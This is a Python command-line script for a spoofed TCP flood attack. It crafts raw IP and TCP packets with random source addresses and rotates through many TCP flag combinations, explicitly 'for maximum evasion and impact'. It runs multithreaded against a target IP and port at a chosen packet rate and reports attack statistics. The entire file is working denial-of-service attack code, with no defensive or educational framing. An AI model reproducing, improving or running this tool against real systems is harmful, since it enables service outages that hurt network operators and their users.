#!/usr/bin/env python3
# TCP Flood with Random Flag Combinations
# Advanced TCP flag spoofing for maximum evasion and impact

import socket
import random
import threading
import time
import sys
import struct
import logging
from scapy.all import *
from scapy.layers.inet import TCP, IP
from enum import Enum
from dataclasses import dataclass
from typing import List, Dict, Tuple
import ipaddress

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('tcp_random_flags.log'),
        logging.StreamHandler()
    ]
)

class TCPFlagCombination(Enum):
    """Predefined TCP flag combinations for different attack types"""
    ACK_ONLY = "ACK"           # Acknowledgement flood
    SYN_ONLY = "SYN"           # SYN flood
    PSH_ONLY = "PSH"           # Push flag flood  
    FIN_ONLY = "FIN"           # Finish flag flood
    RST_ONLY = "RST"           # Reset flag flood
    URG_ONLY = "URG"           # Urgent flag flood
    SYN_ACK = "SYN+ACK"        # SYN-ACK combination
    FIN_ACK = "FIN+ACK"        # FIN-ACK combination
    PSH_ACK = "PSH+ACK"        # PSH-ACK combination
    RST_ACK = "RST+ACK"        # RST-ACK combination
    URG_ACK = "URG+ACK"        # URG-ACK combination
    RANDOM_MIX = "RANDOM"      # Random flag combination

@dataclass
class AttackConfig:
    target_ip: str
    target_port: int
    source_ip: str
    source_port: int
    duration: int
    packets_per_second: int
    flag_combination: TCPFlagCombination
    packet_size: int = 64  # Default TCP header size

class TCPRandomFlagFlooder:
    def __init__(self):
        self.running = True
        self.packets_sent = 0
        self.packets_failed = 0
        self.lock = threading.RLock()
        self.flag_stats: Dict[TCPFlagCombination, int] = {
            flag: 0 for flag in TCPFlagCombination
        }
        
    def generate_random_ip(self) -> str:
        """Generate random valid source IP for spoofing"""
        while True:
            ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            try:
                ipaddress.ip_address(ip)
                return ip
            except:
                continue
    
    def generate_random_port(self) -> int:
        """Generate random source port"""
        return random.randint(1024, 65535)
    
    def generate_realistic_sequence(self) -> int:
        """Generate realistic TCP sequence number"""
        return random.randint(1000, 0x7FFFFFFF)
    
    def generate_realistic_ack(self) -> int:
        """Generate realistic TCP acknowledgement number"""
        return random.randint(1000, 0x7FFFFFFF)
    
    def generate_window_size(self) -> int:
        """Generate realistic TCP window size"""
        return random.choice([8192, 16384, 32768, 65535])
    
    def get_flags_value(self, combination: TCPFlagCombination) -> int:
        """Get TCP flags value for specific combination"""
        flags_mapping = {
            TCPFlagCombination.ACK_ONLY: 0x10,  # ACK
            TCPFlagCombination.SYN_ONLY: 0x02,  # SYN
            TCPFlagCombination.PSH_ONLY: 0x08,  # PSH
            TCPFlagCombination.FIN_ONLY: 0x01,  # FIN
            TCPFlagCombination.RST_ONLY: 0x04,  # RST
            TCPFlagCombination.URG_ONLY: 0x20,  # URG
            TCPFlagCombination.SYN_ACK: 0x12,   # SYN + ACK
            TCPFlagCombination.FIN_ACK: 0x11,   # FIN + ACK
            TCPFlagCombination.PSH_ACK: 0x18,   # PSH + ACK
            TCPFlagCombination.RST_ACK: 0x14,   # RST + ACK
            TCPFlagCombination.URG_ACK: 0x30,   # URG + ACK
        }
        
        if combination == TCPFlagCombination.RANDOM_MIX:
            # Generate random combination of 2-3 flags
            available_flags = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20]
            num_flags = random.randint(2, 3)
            selected_flags = random.sample(available_flags, num_flags)
            return sum(selected_flags)
        
        return flags_mapping.get(combination, 0x10)  # Default to ACK
    
    def create_tcp_packet(self, config: AttackConfig) -> Optional[bytes]:
        """Create raw TCP packet with specified flags"""
        try:
            # TCP header fields
            source_port = config.source_port
            dest_port = config.target_port
            seq_num = self.generate_realistic_sequence()
            ack_num = self.generate_realistic_ack() if random.random() > 0.3 else 0
            data_offset = 5 << 4  # 5 words (20 bytes header)
            flags = self.get_flags_value(config.flag_combination)
            window = self.generate_window_size()
            checksum = 0  # Will be calculated by kernel/scapy
            urg_ptr = random.randint(0, 65535) if flags & 0x20 else 0
            
            # Options (for more realism)
            options = b''
            if random.random() > 0.7:
                # Add some TCP options occasionally
                options = b'\x02\x04\x05\xb4'  # MSS option
                
            # Pack TCP header
            tcp_header = struct.pack('!HHLLBBHHH', 
                                   source_port, dest_port, seq_num, ack_num,
                                   data_offset, flags, window, checksum, urg_ptr)
            
            # Add options if present
            tcp_header += options
            
            # Add padding to reach desired packet size
            padding_needed = max(0, config.packet_size - len(tcp_header))
            if padding_needed > 0:
                tcp_header += os.urandom(padding_needed)
            
            return tcp_header
            
        except Exception as e:
            logging.error(f"TCP packet creation failed: {e}")
            return None
    
    def send_raw_tcp_flood(self, config: AttackConfig):
        """Send raw TCP packets with specified flag combinations"""
        end_time = time.time() + config.duration
        packet_interval = 1.0 / config.packets_per_second
        
        logging.info(f"Starting TCP {config.flag_combination.value} flood on {config.target_ip}:{config.target_port}")
        
        try:
            # Create raw socket for TCP packet injection
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while time.time() < end_time and self.running:
                try:
                    # Update source for each packet for better spoofing
                    current_config = AttackConfig(
                        target_ip=config.target_ip,
                        target_port=config.target_port,
                        source_ip=self.generate_random_ip(),
                        source_port=self.generate_random_port(),
                        duration=config.duration,
                        packets_per_second=config.packets_per_second,
                        flag_combination=config.flag_combination,
                        packet_size=config.packet_size
                    )
                    
                    # Create TCP packet
                    tcp_packet = self.create_tcp_packet(current_config)
                    if tcp_packet is None:
                        continue
                    
                    # Create IP header manually for raw socket
                    ip_header = self.create_ip_header(
                        current_config.source_ip, 
                        current_config.target_ip, 
                        len(tcp_packet)
                    )
                    
                    # Combine and send
                    full_packet = ip_header + tcp_packet
                    sock.sendto(full_packet, (current_config.target_ip, 0))
                    
                    with self.lock:
                        self.packets_sent += 1
                        self.flag_stats[config.flag_combination] += 1
                    
                    # Maintain rate limiting
                    time.sleep(packet_interval)
                    
                except socket.error as e:
                    with self.lock:
                        self.packets_failed += 1
                    time.sleep(0.01)
                except Exception as e:
                    logging.error(f"Unexpected error: {e}")
                    time.sleep(0.1)
                    
        except PermissionError:
            logging.error("Root privileges required for raw socket operation!")
            logging.error("Run with sudo or as administrator")
        except Exception as e:
            logging.error(f"Flood attack failed: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
    
    def create_ip_header(self, src_ip: str, dst_ip: str, data_length: int) -> bytes:
        """Create IP header for raw socket"""
        # IP header fields
        version = 4
        ihl = 5
        version_ihl = (version << 4) + ihl
        tos = 0
        total_length = 20 + data_length  # IP header + TCP data
        identification = random.randint(0, 65535)
        flags = 0
        fragment_offset = 0
        ttl = 64
        protocol = socket.IPPROTO_TCP
        checksum = 0
        source_addr = socket.inet_aton(src_ip)
        dest_addr = socket.inet_aton(dst_ip)
        
        # Pack IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl, tos, total_length, identification,
                              (flags << 13) + fragment_offset, ttl, protocol,
                              checksum, source_addr, dest_addr)
        
        return ip_header
    
    def start_mixed_attack(self, target_ip: str, target_port: int, duration: int,
                          total_pps: int = 1000, threads_per_flag: int = 3):
        """Start mixed attack with all flag combinations"""
        
        flag_combinations = list(TCPFlagCombination)
        threads = []
        
        # Calculate PPS per flag type
        pps_per_flag = max(1, total_pps // len(flag_combinations))
        pps_per_thread = max(1, pps_per_flag // threads_per_flag)
        
        logging.info(f"Starting mixed TCP flag attack on {target_ip}:{target_port}")
        logging.info(f"Total duration: {duration}s, Target rate: {total_pps} pps")
        logging.info(f"Using {len(flag_combinations)} flag combinations with {threads_per_flag} threads each")
        
        # Create and start threads for each flag combination
        for flag_combo in flag_combinations:
            for thread_num in range(threads_per_flag):
                config = AttackConfig(
                    target_ip=target_ip,
                    target_port=target_port,
                    source_ip=self.generate_random_ip(),
                    source_port=self.generate_random_port(),
                    duration=duration,
                    packets_per_second=pps_per_thread,
                    flag_combination=flag_combo,
                    packet_size=random.randint(40, 1500)  # Random packet size
                )
                
                thread = threading.Thread(
                    target=self.send_raw_tcp_flood,
                    args=(config,),
                    daemon=True,
                    name=f"TCP_{flag_combo.value}_{thread_num}"
                )
                threads.append(thread)
                thread.start()
        
        # Monitor progress
        start_time = time.time()
        try:
            while time.time() < start_time + duration and self.running:
                elapsed = time.time() - start_time
                remaining = max(0, duration - elapsed)
                
                with self.lock:
                    current_sent = self.packets_sent
                    current_failed = self.packets_failed
                
                # Print detailed statistics
                stats_text = ", ".join([f"{f.value}:{c}" for f, c in self.flag_stats.items() if c > 0])
                logging.info(
                    f"Elapsed: {elapsed:.1f}s | Packets: {current_sent} | "
                    f"Failed: {current_failed} | Flags: [{stats_text}]"
                )
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            logging.info("Attack interrupted by user")
            self.running = False
        
        # Wait for threads to complete
        for thread in threads:
            thread.join(timeout=5)
        
        # Final statistics
        total_time = time.time() - start_time
        with self.lock:
            total_sent = self.packets_sent
            total_failed = self.packets_failed
        
        logging.info("=" * 60)
        logging.info("ATTACK COMPLETED - FINAL STATISTICS")
        logging.info("=" * 60)
        logging.info(f"Total duration: {total_time:.1f} seconds")
        logging.info(f"Total packets sent: {total_sent}")
        logging.info(f"Total packets failed: {total_failed}")
        logging.info(f"Average rate: {total_sent/total_time:.1f} packets/second")
        logging.info("Flag distribution:")
        for flag, count in sorted(self.flag_stats.items(), key=lambda x: x[1], reverse=True):
            if count > 0:
                percentage = (count / total_sent) * 100
                logging.info(f"  {flag.value:15}: {count:8} packets ({percentage:5.1f}%)")

def validate_target(target_str: str) -> Tuple[str, int]:
    """Validate and parse target IP:port string"""
    if ':' not in target_str:
        raise ValueError("Target must be in format IP:PORT")
    
    ip, port_str = target_str.split(':', 1)
    
    try:
        ipaddress.ip_address(ip)
        port = int(port_str)
        if not 1 <= port <= 65535:
            raise ValueError("Port must be between 1-65535")
        return ip, port
    except ValueError as e:
        raise ValueError(f"Invalid target format: {e}")

def main():
    """Command-line interface for TCP random flag flood"""
    if len(sys.argv) < 4:
        print("TCP Random Flag Flood Attack")
        print("Usage: python3 tcp_random_flags.py <target:port> <duration> <packets_per_second>")
        print("Example: python3 tcp_random_flags.py 192.168.1.1:80 60 5000")
        print("Note: Requires root/administrator privileges for raw socket access")
        sys.exit(1)
    
    try:
        target_ip, target_port = validate_target(sys.argv[1])
        duration = int(sys.argv[2])
        packets_per_second = int(sys.argv[3])
        
        if duration <= 0:
            raise ValueError("Duration must be positive")
        if packets_per_second <= 0:
            raise ValueError("Packets per second must be positive")
        
        # Check for root privileges
        if os.geteuid() != 0:
            print("ERROR: Root privileges required for raw socket operations!")
            print("Please run with: sudo python3 tcp_random_flags.py ...")
            sys.exit(1)
        
        flooder = TCPRandomFlagFlooder()
        flooder.start_mixed_attack(target_ip, target_port, duration, packets_per_second)
        
    except ValueError as e:
        logging.error(f"Invalid parameter: {e}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()